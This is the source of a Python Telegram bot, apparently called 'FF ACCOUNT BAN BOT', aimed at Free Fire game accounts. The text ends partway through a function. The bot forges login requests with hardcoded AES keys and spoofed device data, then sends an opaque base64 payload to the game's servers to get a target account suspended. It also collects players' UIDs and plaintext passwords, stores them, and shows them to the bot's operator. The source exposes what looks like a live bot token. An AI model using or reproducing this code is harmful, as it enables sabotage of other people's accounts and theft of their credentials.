import os
import sys
import json
import time
import base64
import asyncio
import threading
import requests
import urllib3
import urllib.parse
import sqlite3
from datetime import datetime

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters
)

urllib3.disable_warnings()

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    print("\n[!] The 'pycryptodome' library is missing. Please install it: pip install pycryptodome")
    sys.exit(1)

try:
    import MajoRLogin_pb2 as mLpB
    import MajorLoginRes_pb2 as mLrPb
except ImportError:
    print("\n[!] Error: Protobuf files (MajoRLogin_pb2.py, MajorLoginRes_pb2.py) not found in the same directory!")
    sys.exit(1)


# ================== CONFIG ==================
BOT_TOKEN = "8738117900:AAGN7kNIkJPlSaL_nTkc763ILstVtP6K-XQ"
ADMIN_IDS = [8128075446]
DB_FILE = "bot_data.db"

# ---- Force Join Channels ----
CHANNEL_LINK = "https://t.me/freefireob51"           # 👈 আপনার চ্যানেল লিংক
GROUP_LINK   = "https://t.me/free_like_bot1"     # 👈 আপনার গ্রুপ লিংক
CHANNEL_NAME = "Script Files ⎙ FreeFire"
GROUP_NAME   = "FREE LIKE BOT 🇧🇩"

BODY_BASE64 = (
    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
)

AeSkEy = b'Yg&tc%DEuh6%Zc^8'
AeSiV  = b'6oyZDr22E3ychjM%'
mLuRl  = "https://loginbp.ggpolarbear.com/MajorLogin"

mLhDr  = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/octet-stream",
    "Expect": "100-continue",
    "X-GA": "v1 1",
    "X-Unity-Version": "2018.4.11f1",
    "ReleaseVersion": "OB54"
}

# যারা verify করেছে
VERIFIED_USERS = set()


# ================== DATABASE ==================
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS jwt_creds (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uid TEXT UNIQUE,
            password TEXT,
            region TEXT,
            added_by TEXT,
            added_at TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS jwt_tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            token TEXT UNIQUE,
            nickname TEXT,
            account_id TEXT,
            region TEXT,
            added_by TEXT,
            added_at TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS access_tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            token TEXT UNIQUE,
            nickname TEXT,
            account_id TEXT,
            region TEXT,
            added_by TEXT,
            added_at TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS ban_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            account_id TEXT,
            nickname TEXT,
            region TEXT,
            version TEXT,
            status TEXT,
            added_by TEXT,
            added_at TEXT
        )
    """)
    conn.commit()
    conn.close()


def db_insert_jwt_cred(uid, password, region, added_by):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    try:
        c.execute(
            "INSERT INTO jwt_creds (uid, password, region, added_by, added_at) VALUES (?,?,?,?,?)",
            (uid, password, region, added_by, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        )
        conn.commit()
        return True
    except sqlite3.IntegrityError:
        return False
    finally:
        conn.close()


def db_insert_jwt_token(token, nickname, account_id, region, added_by):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    try:
        c.execute(
            "INSERT INTO jwt_tokens (token, nickname, account_id, region, added_by, added_at) VALUES (?,?,?,?,?,?)",
            (token, nickname, account_id, region, added_by, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        )
        conn.commit()
        return True
    except sqlite3.IntegrityError:
        return False
    finally:
        conn.close()


def db_insert_access_token(token, nickname, account_id, region, added_by):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    try:
        c.execute(
            "INSERT INTO access_tokens (token, nickname, account_id, region, added_by, added_at) VALUES (?,?,?,?,?,?)",
            (token, nickname, account_id, region, added_by, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        )
        conn.commit()
        return True
    except sqlite3.IntegrityError:
        return False
    finally:
        conn.close()


def db_insert_ban_log(account_id, nickname, region, version, status, added_by):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        "INSERT INTO ban_logs (account_id, nickname, region, version, status, added_by, added_at) VALUES (?,?,?,?,?,?,?)",
        (account_id, nickname, region, version, status, added_by, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    )
    conn.commit()
    conn.close()


def db_get_jwt_creds(limit=30):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT uid, password, region, added_by, added_at FROM jwt_creds ORDER BY id DESC LIMIT ?", (limit,))
    rows = c.fetchall()
    conn.close()
    return rows


def db_get_jwt_tokens(limit=30):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT token, nickname, account_id, region, added_by, added_at FROM jwt_tokens ORDER BY id DESC LIMIT ?", (limit,))
    rows = c.fetchall()
    conn.close()
    return rows


def db_get_access_tokens(limit=30):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT token, nickname, account_id, region, added_by, added_at FROM access_tokens ORDER BY id DESC LIMIT ?", (limit,))
    rows = c.fetchall()
    conn.close()
    return rows


def db_get_ban_logs(limit=30):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT account_id, nickname, region, version, status, added_by, added_at FROM ban_logs ORDER BY id DESC LIMIT ?", (limit,))
    rows = c.fetchall()
    conn.close()
    return rows


def db_count():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM jwt_creds"); j = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM jwt_tokens"); jt = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM access_tokens"); a = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM ban_logs"); b = c.fetchone()[0]
    conn.close()
    return j, jt, a, b


# ================== HELPERS ==================
def is_admin(uid):
    return uid in ADMIN_IDS


def is_jwt_format(tok):
    return tok.startswith("ey") and tok.count(".") == 2


def decode_ff_name(b64_str):
    try:
        if not b64_str: return "Unknown"
        key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
        b64_str = b64_str.strip()
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        encrypted_bytes = base64.b64decode(b64_str)
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            key_byte = key[i % len(key)]
            decrypted_bytes.append(byte ^ key_byte)
        name = decrypted_bytes.decode('utf-8', errors='ignore')
        return name if name else "Unknown"
    except Exception:
        return "Unknown"


def enc(d):
    return AES.new(AeSkEy, AES.MODE_CBC, AeSiV).encrypt(pad(d, 16))


def dec(d):
    return unpad(AES.new(AeSkEy, AES.MODE_CBC, AeSiV).decrypt(d), 16)


def build_majorlogin(tok, open_id, p_type):
    m = mLpB.MajorLogin()
    m.event_time = str(datetime.now())[:-7]
    m.game_name = "free fire"
    m.platform_id = p_type
    m.client_version = "1.120.1"
    m.system_software = "Android OS 9 / API-28"
    m.system_hardware = "Handheld"
    m.telecom_operator = "Verizon"
    m.network_type = "WIFI"
    m.screen_width = 1920
    m.screen_height = 1080
    m.screen_dpi = "280"
    m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
    m.memory = 3003
    m.gpu_renderer = "Adreno (TM) 640"
    m.gpu_version = "OpenGL ES 3.1 v1.46"
    m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
    m.client_ip = "223.191.51.89"
    m.language = "en"
    m.open_id = open_id
    m.open_id_type = str(p_type)
    m.device_type = "Handheld"
    m.access_token = tok
    m.platform_sdk_id = 1
    m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
    m.login_by = 3
    m.channel_type = 3
    m.cpu_type = 2
    m.cpu_architecture = "64"
    m.client_version_code = "2019118695"
    m.login_open_id_type = p_type
    m.origin_platform_type = str(p_type)
    m.primary_platform_type = str(p_type)
    return enc(m.SerializeToString())


def generate_jwt_api(uid, password):
    try:
        encoded_password = urllib.parse.quote(password, safe='')
        api_url = f"https://jihad-jwt.lovable.app/api/public/token?uid={uid}&password={encoded_password}"
        response = requests.get(api_url, timeout=15)
        if response.status_code == 200:
            try:
                data = response.json()
                if isinstance(data, dict):
                    for key in ["token", "access_token", "jwt", "data"]:
                        if key in data and isinstance(data[key], str):
                            return data[key], None
                    return json.dumps(data), None
                return str(data), None
            except json.JSONDecodeError:
                return response.text.strip(), None
        else:
            return None, f"API Error: Status {response.status_code} - {response.text.strip()}"
    except requests.exceptions.ConnectionError:
        return None, "Internet Error! Please check your network connection."
    except Exception as e:
        return None, f"Unexpected Error: {str(e)}"


def fetch_majorlogin_jwt(tok):
    if tok.startswith("ey") and "." in tok:
        return tok, None
    oId = None
    try:
        r = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={tok}",
                         headers={"User-Agent": "Mozilla/5.0"}, timeout=5).json()
        oId = r.get("open_id")
    except:
        pass
    if not oId:
        try:
            uid_headers = {"access-token": tok, "user-agent": "Mozilla/5.0"}
            uid_res = requests.get("https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/",
                                   headers=uid_headers, verify=False, timeout=5).json()
            uid = uid_res.get("uid")
            if uid:
                openid_res = requests.post("https://topup.pk/api/auth/player_id_login",
                                           headers={"Content-Type": "application/json"},
                                           json={"app_id": 100067, "login_id": str(uid)},
                                           verify=False, timeout=5).json()
                oId = openid_res.get("open_id")
        except:
            pass
    if not oId:
        return None, "Failed to extract Open ID. Token is invalid or expired."
    platforms = [8, 3, 4, 6]
    for p_type in platforms:
        pl = build_majorlogin(tok, oId, p_type)
        try:
            x = requests.post(mLuRl, headers=mLhDr, data=pl, timeout=10, verify=False)
            if x.status_code == 200:
                res = mLrPb.MajorLoginRes()
                try:
                    res.ParseFromString(dec(x.content))
                except:
                    res.ParseFromString(x.content)
                if res.token:
                    return res.token, None
        except:
            continue
    return None, "MajorLogin failed. Account might be blocked or platform mismatch."


def decode_jwt(token):
    try:
        payload_part = token.split('.')[1]
        payload_part += "=" * ((4 - len(payload_part) % 4) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload_part)
        decoded_str = decoded_bytes.decode('utf-8')
        return json.loads(decoded_str)
    except Exception:
        return {}


def get_base_url(lock_region):
    lock_region = lock_region.upper()
    ind_regions = ["IND"]
    us_regions = ["BR", "US", "SAC", "NA"]
    if lock_region in ind_regions:
        return "https://client.ind.freefiremobile.com"
    elif lock_region in us_regions:
        return "https://client.us.freefiremobile.com"
    else:
        return "https://clientbp.ggpolarbear.com"


def trigger_injection(jwt_token, version, base_url):
    api_url = f"{base_url}/GetLoginData"
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
        'Accept-Encoding': 'gzip'
    }
    body = base64.b64decode(BODY_BASE64)
    return requests.post(api_url, headers=headers, data=body, timeout=20, verify=False)


# ================== LOADING ANIMATION ==================
def run_with_loader_sync(func, text="PROCESSING"):
    result_data = {"result": None, "error": None}

    def worker():
        try:
            result_data["result"] = func()
        except Exception as e:
            result_data["error"] = e

    t = threading.Thread(target=worker)
    t.start()

    spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
    bar_length = 25
    i = 0.0
    spin_idx = 0
    pad_text = text.ljust(14)

    sys.stdout.write("\n")
    while t.is_alive():
        percent = min(99, int(i))
        spin = spinner[spin_idx % len(spinner)]
        filled = int(bar_length * percent / 100)
        bar = '█' * filled + '░' * (bar_length - filled)
        sys.stdout.write(f"\r [{spin}] {pad_text}: [{bar}] {percent:>2}%")
        sys.stdout.flush()
        time.sleep(0.05)
        spin_idx += 1
        if i < 99:
            i += 1.5

    bar = '█' * bar_length
    sys.stdout.write(f"\r [✔] {pad_text}: [{bar}] 100%\n")
    sys.stdout.flush()

    if result_data["error"]:
        return None, result_data["error"]
    return result_data["result"], None


async def animated_loader(update: Update, text="PROCESSING"):
    spinner = ['⏳', '⌛', '⏳', '⌛']
    bar_length = 18
    msg = await update.message.reply_text(
        f"⏳ *{text}*\n`[░░░░░░░░░░░░░░░░░░]` 0%",
        parse_mode="Markdown"
    )
    i = 0.0
    spin_idx = 0
    while i < 100:
        percent = min(99, int(i))
        spin = spinner[spin_idx % len(spinner)]
        filled = int(bar_length * percent / 100)
        bar = '█' * filled + '░' * (bar_length - filled)
        try:
            await msg.edit_text(
                f"{spin} *{text}*\n`[{bar}]` {percent}%",
                parse_mode="Markdown"
            )
        except Exception:
            pass
        await asyncio.sleep(0.18)
        spin_idx += 1
        i += 7
    bar = '█' * bar_length
    try:
        await msg.edit_text(
            f"✅ *{text}*\n`[{bar}]` 100%",
            parse_mode="Markdown"
        )
    except Exception:
        pass
    return msg


# ================== REPLY KEYBOARD BUILDERS ==================
def main_reply_keyboard(is_admin_user=False):
    """মেইন মেনু — ৩টি বাটন।"""
    keyboard = [
        [KeyboardButton("🔑 JWT TOKEN GENERATE")],
        [KeyboardButton("💀 ACCOUNT BAN")],
        [KeyboardButton("ℹ️ HELP")],
    ]
    if is_admin_user:
        keyboard.append([KeyboardButton("🛠 ADMIN PANEL")])
    return ReplyKeyboardMarkup(
        keyboard,
        resize_keyboard=True,
        one_time_keyboard=False,
        input_field_placeholder="একটি অপশন সিলেক্ট করুন..."
    )


def cancel_only_keyboard():
    """শুধু CANCEL বাটন দেখাবে।"""
    keyboard = [[KeyboardButton("❌ CANCEL")]]
    return ReplyKeyboardMarkup(
        keyboard,
        resize_keyboard=True,
        one_time_keyboard=False,
        input_field_placeholder="Cancel করতে ❌ CANCEL চাপুন..."
    )


def force_join_keyboard():
    """Force Join বাটন (Channel + Group + Verify)।"""
    keyboard = [
        [InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK)],
        [InlineKeyboardButton("👥 Join Group", url=GROUP_LINK)],
        [InlineKeyboardButton("✅ VERIFY", callback_data="verify_join")],
    ]
    return InlineKeyboardMarkup(keyboard)


# ================== HELP TEXT ==================
HELP_TEXT = (
    "ℹ️ *HOW TO USE THIS BOT*\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

    "🤖 *FF ACCOUNT BAN BOT*\n"
    "Developer: *YASIN BHAI*\n\n"

    "📢 https://t.me/freefireob51\n\n"

    "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "🔑 *COMMAND 1 — JWT TOKEN GENERATE*\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "1️⃣ Tap the *🔑 JWT TOKEN GENERATE* button.\n"
    "2️⃣ Send your credentials in this format:\n"
    "    `UID PASSWORD`\n\n"
    "📌 Example:\n"
    "    `18301016398 mypassword123`\n\n"
    "3️⃣ The bot will generate your JWT Token.\n"
    "4️⃣ Copy the token and use it in COMMAND 2.\n\n"

    "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "💀 *COMMAND 2 — ACCOUNT BAN*\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "1️⃣ Tap the *💀 ACCOUNT BAN* button.\n"
    "2️⃣ Send either:\n"
    "   • Your *Access Token* (64-char hex)\n"
    "   • Or your *JWT Token* (starts with `eyJ...`)\n\n"
    "3️⃣ The bot authenticates and injects the ban.\n"
    "4️⃣ Wait for the loading animation to finish.\n"
    "5️⃣ You will see:\n"
    "   • Target Name / UID / Region\n"
    "   • Patch Version\n"
    "   • Status: 💀 SUSPENDED\n"
    "   • Ban Check: ✅ YES / ❌ NO\n\n"

    "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "🛠 *ADMIN PANEL* (Admins only)\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "• 🔑 JWT Creds — Saved UID + Passwords\n"
    "• 🎫 JWT Tokens — Saved JWT Tokens\n"
    "• 🔐 Access Tokens — Saved Access Tokens\n"
    "• 💀 Ban Logs — All Ban History\n\n"

    "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "📞 *SUPPORT*\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "📢 Channel: https://t.me/freefireob51\n"
    "👨‍💻 Developer: *YASIN BHAI*\n\n"

    "⚠️ *NOTE:* This bot is for educational purposes only.\n"
    "Use responsibly.\n"
)


# ================== TELEGRAM HANDLERS ==================
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    context.user_data["state"] = None

    # ✅ Force Join (প্রথমবার হলে)
    if user.id not in VERIFIED_USERS and not is_admin(user.id):
        await update.message.reply_text(
            f"👋 *Welcome {user.first_name}!*\n\n"
            f"🔒 *To use this bot, please join our Channel and Group first.*\n\n"
            f"1️⃣ Join the Channel\n"
            f"2️⃣ Join the Group\n"
            f"3️⃣ Tap ✅ VERIFY\n\n"
            f"📢 Channel: {CHANNEL_NAME}\n"
            f"👥 Group: {GROUP_NAME}",
            parse_mode="Markdown",
            reply_markup=force_join_keyboard()
        )
        return

    # Admin / Verified user → সরাসরি মেইন মেনু
    await update.message.reply_text(
        f"👋 *স্বাগতম {user.first_name}!*\n\n"
        f"🤖 *FF ACCOUNT BAN BOT*\n"
        f"👨‍💻 Developer: *YASIN BHAI*\n\n"
        f"নিচের বাটন থেকে অপশন সিলেক্ট করুন 👇",
        parse_mode="Markdown",
        reply_markup=main_reply_keyboard(is_admin(user.id))
    )


async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    context.user_data["state"] = None

    # ✅ CANCEL message (বাংলা লেখা সরানো হয়েছে)
    await update.message.reply_text(
        "👋",
        reply_markup=main_reply_keyboard(is_admin(user.id))
    )


async def verify_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """✅ VERIFY বাটনে ক্লিক করলে মেইন মেনু দেখাবে।"""
    query = update.callback_query
    await query.answer()
    user = query.from_user

    VERIFIED_USERS.add(user.id)

    try:
        await query.message.delete()
    except Exception:
        pass

    await query.message.reply_text(
        f"✅ *Verification Successful!*\n\n"
        f"👋 Welcome {user.first_name}!\n\n"
        f"🤖 *FF ACCOUNT BAN BOT*\n"
        f"👨‍💻 Developer: *YASIN BHAI*\n\n"
        f"নিচের বাটন থেকে অপশন সিলেক্ট করুন 👇",
        parse_mode="Markdown",
        reply_markup=main_reply_keyboard(is_admin(user.id))
    )


async def show_admin_panel_msg(update: Update):
    j, jt, a, b = db_count()
    keyboard = [
        [InlineKeyboardButton(f"🔑  JWT Creds  ({j})  ", callback_data="admin_jwt")],
        [InlineKeyboardButton(f"🎫  JWT Tokens  ({jt})  ", callback_data="admin_jwt_tokens")],
        [InlineKeyboardButton(f"🔐  Access Tokens  ({a})  ", callback_data="admin_access")],
        [InlineKeyboardButton(f"💀  Ban Logs  ({b})  ", callback_data="admin_ban")],
        [InlineKeyboardButton("🔙  Back  ", callback_data="admin_back")],
    ]
    await update.message.reply_text(
        "🛠 *ADMIN PANEL*\n\n"
        "নিচের যেকোনো সেকশনে ক্লিক করুন 👇",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    if not is_admin(user.id):
        await query.message.reply_text("⛔ আপনি Admin নন।")
        return

    data = query.data

    if data == "admin_back":
        try:
            await query.message.delete()
        except Exception:
            pass
        await query.message.reply_text(
            "🏠 *মেইন মেনু*\n\nনিচের বাটন থেকে অপশন সিলেক্ট করুন 👇",
            parse_mode="Markdown",
            reply_markup=main_reply_keyboard(True)
        )
        return

    if data == "admin_jwt":
        rows = db_get_jwt_creds(30)
        if not rows:
            await query.message.reply_text("📭 কোনো JWT Creds নেই।")
            return
        txt = "🔑 *Last 30 JWT Credentials (UID + Password)*\n\n"
        for r in rows:
            uid, pw, region, by, at = r
            txt += (
                f"👤 *UID:* `{uid}`\n"
                f"🔒 *Password:* `{pw}`\n"
                f"🌍 *Region:* `{region}`\n"
                f"🆔 *By:* `{by}`\n"
                f"🕒 *At:* {at}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
            )
        for chunk in [txt[i:i+3900] for i in range(0, len(txt), 3900)]:
            await query.message.reply_text(chunk, parse_mode="Markdown")

    elif data == "admin_jwt_tokens":
        rows = db_get_jwt_tokens(30)
        if not rows:
            await query.message.reply_text("📭 কোনো JWT Tokens নেই।")
            return
        txt = "🎫 *Last 30 JWT Tokens*\n\n"
        for r in rows:
            token, nick, acc, region, by, at = r
            txt += (
                f"👤 *Nick:* `{nick}`\n"
                f"🆔 *Acc:* `{acc}`\n"
                f"🌍 *Region:* `{region}`\n"
                f"🎫 *JWT Token:* `{token[:60]}...`\n"
                f"🆔 *By:* `{by}`\n"
                f"🕒 *At:* {at}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
            )
        for chunk in [txt[i:i+3900] for i in range(0, len(txt), 3900)]:
            await query.message.reply_text(chunk, parse_mode="Markdown")

    elif data == "admin_access":
        rows = db_get_access_tokens(30)
        if not rows:
            await query.message.reply_text("📭 কোনো Access Tokens নেই।")
            return
        txt = "🔐 *Last 30 Access Tokens*\n\n"
        for r in rows:
            token, nick, acc, region, by, at = r
            txt += (
                f"👤 *Nick:* `{nick}`\n"
                f"🆔 *Acc:* `{acc}`\n"
                f"🌍 *Region:* `{region}`\n"
                f"🔐 *Access Token:* `{token[:60]}...`\n"
                f"🆔 *By:* `{by}`\n"
                f"🕒 *At:* {at}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
            )
        for chunk in [txt[i:i+3900] for i in range(0, len(txt), 3900)]:
            await query.message.reply_text(chunk, parse_mode="Markdown")

    elif data == "admin_ban":
        rows = db_get_ban_logs(30)
        if not rows:
            await query.message.reply_text("📭 কোনো Ban Logs নেই।")
            return
        txt = "💀 *Last 30 Ban Logs*\n\n"
        for r in rows:
            acc, nick, region, version, status, by, at = r
            txt += (
                f"👤 *Nick:* `{nick}`\n"
                f"🆔 *Acc:* `{acc}`\n"
                f"🌍 *Region:* `{region}`\n"
                f"📦 *Ver:* `{version}`\n"
                f"📊 *Status:* `{status}`\n"
                f"🆔 *By:* `{by}`\n"
                f"🕒 *At:* {at}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
            )
        for chunk in [txt[i:i+3900] for i in range(0, len(txt), 3900)]:
            await query.message.reply_text(chunk, parse_mode="Markdown")


async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = update.message.text.strip()
    state = context.user_data.get("state")

    # ---------- Force Join check (Verify ছাড়া কিছুই কাজ করবে না) ----------
    if user.id not in VERIFIED_USERS and not is_admin(user.id):
        await update.message.reply_text(
            "🔒 *Please verify first!*\n\n"
            "Join our Channel and Group, then tap ✅ VERIFY.",
            parse_mode="Markdown",
            reply_markup=force_join_keyboard()
        )
        return
    # ---------- End Force Join ----------

    # ---------- CANCEL Button ----------
    if text == "❌ CANCEL":
        context.user_data["state"] = None
        try:
            await update.message.delete()
        except Exception:
            pass
        # ✅ বাংলা লেখা সরানো, শুধু 👋 ইমোজি
        await update.message.reply_text(
            "👋",
            reply_markup=main_reply_keyboard(is_admin(user.id))
        )
        return
    # ---------- End CANCEL ----------

    # ---------- Reply Keyboard Button Detection ----------
    if text == "🔑 JWT TOKEN GENERATE":
        context.user_data["state"] = "await_jwt_creds"
        await update.message.reply_text(
            "🔑 *JWT TOKEN GENERATOR*\n\n"
            "📝 ফরম্যাট:\n`UID PASSWORD`\n\n"
            "📌 উদাহরণ:\n`18301016398 mypassword123`\n\n"
            "➡️ বাতিল করতে নিচের ❌ CANCEL বাটন চাপুন।",
            parse_mode="Markdown",
            reply_markup=cancel_only_keyboard()
        )
        return

    if text == "💀 ACCOUNT BAN":
        context.user_data["state"] = "await_access_token"
        await update.message.reply_text(
            "💀 *ACCOUNT BAN INJECTION*\n\n"
            "📝 আপনার Access Token অথবা JWT Token পাঠান।\n\n"
            "➡️ বাতিল করতে নিচের ❌ CANCEL বাটন চাপুন।",
            parse_mode="Markdown",
            reply_markup=cancel_only_keyboard()
        )
        return

    if text == "ℹ️ HELP":
        # ✅ HELP message চালু
        await update.message.reply_text(
            HELP_TEXT,
            parse_mode="Markdown",
            disable_web_page_preview=True,
            reply_markup=main_reply_keyboard(is_admin(user.id))
        )
        return

    if text == "🛠 ADMIN PANEL":
        if not is_admin(user.id):
            await update.message.reply_text("⛔ আপনি Admin নন।")
            return
        await show_admin_panel_msg(update)
        return
    # ---------- End Reply Keyboard Detection ----------

    if not state:
        await update.message.reply_text(
            "ℹ️ শুরু করতে /start দিন অথবা নিচের বাটন ব্যবহার করুন।",
            reply_markup=main_reply_keyboard(is_admin(user.id))
        )
        return

    # ================== JWT GENERATE ==================
    if state == "await_jwt_creds":
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            await update.message.reply_text("❌ ফরম্যাট ভুল। `UID PASSWORD` দিন।", parse_mode="Markdown")
            return
        uid, password = parts[0].strip(), parts[1].strip()

        api_result = {"token": None, "error": None}

        def call_api():
            tok, err = generate_jwt_api(uid, password)
            api_result["token"] = tok
            api_result["error"] = err

        api_thread = threading.Thread(target=call_api)
        api_thread.start()

        loader_msg = await animated_loader(update, "GENERATING JWT TOKEN")

        while api_thread.is_alive():
            await asyncio.sleep(0.1)

        token = api_result["token"]
        error = api_result["error"]

        if not token:
            await loader_msg.edit_text(f"❌ টোকেন জেনারেট ব্যর্থ:\n`{error}`", parse_mode="Markdown")
            context.user_data["state"] = None
            await update.message.reply_text(
                "🏠 *মেইন মেনু*",
                parse_mode="Markdown",
                reply_markup=main_reply_keyboard(is_admin(user.id))
            )
            return

        user_data = decode_jwt(token)
        region = user_data.get('lock_region') or user_data.get('region') or 'N/A'

        db_insert_jwt_cred(uid, password, region, str(user.id))

        await loader_msg.edit_text(
            f"✅ *TOKEN GENERATED SUCCESSFULLY*\n\n"
            f"🆔 UID: `{uid}`\n"
            f"🌍 Region: `{region}`\n"
            f"👤 Owner: *YASIN BHAI*\n\n"
            f"🔑 *Token:*\n`{token}`",
            parse_mode="Markdown"
        )
        context.user_data["state"] = None
        await update.message.reply_text(
            "🏠 *মেইন মেনু*",
            parse_mode="Markdown",
            reply_markup=main_reply_keyboard(is_admin(user.id))
        )

    # ================== ACCOUNT BAN ==================
    elif state == "await_access_token":
        input_is_jwt = is_jwt_format(text)

        auth_result = {"jwt": None, "err": None}

        def do_auth():
            r, e = fetch_majorlogin_jwt(text)
            if isinstance(r, tuple):
                r = r[0]
            auth_result["jwt"] = r
            auth_result["err"] = e

        auth_thread = threading.Thread(target=do_auth)
        auth_thread.start()

        loader_msg = await animated_loader(update, "AUTHENTICATING")
        while auth_thread.is_alive():
            await asyncio.sleep(0.1)

        jwt_token = auth_result["jwt"]
        err = auth_result["err"]

        if err or not jwt_token:
